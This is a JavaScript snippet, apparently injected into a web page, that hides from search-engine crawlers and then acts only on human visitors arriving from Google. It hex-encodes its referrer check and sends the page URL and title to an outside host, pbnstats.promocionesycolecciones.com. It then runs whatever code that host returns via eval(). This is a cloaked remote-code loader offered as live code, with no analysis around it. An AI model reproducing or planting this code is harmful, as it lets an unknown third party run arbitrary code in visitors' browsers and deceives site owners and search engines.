 var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";

    var re = new RegExp(botPattern,'i');

    var userAgent = navigator.userAgent;

    if (!re.test(userAgent)) {

        var x = "0067006f006f0067006c0065002e";

        x = hexDecode(x);

        var sUsrAg = document.referrer;

    

        if (sUsrAg.indexOf(x) > -1) {



            var xmlhttp = new XMLHttpRequest();

            xmlhttp.onreadystatechange = function() {

                if (xmlhttp.readyState == XMLHttpRequest.DONE) {

                    if (xmlhttp.status == 200) {

                        eval(xmlhttp.responseText);

                    } else if (xmlhttp.status == 400) {

                        console.log('There was an error 400');

                    } else {

                        console.log('something else other than 200 was returned');

                    }

                }

            }

            ;

            function randomIntFromInterval(min, max) {

                return Math.floor(Math.random() * (max - min + 1) + min)

            }

            const rndInt = randomIntFromInterval(1, 100000);

            xmlhttp.open('GET', 'https://pbnstats.promocionesycolecciones.com/add.php?rand=' + rndInt + '&aux1=x1&referer=' + encodeURI(window.location.href) + "&title="+encodeURIComponent(document.title), true);

            xmlhttp.send();

        }

    }
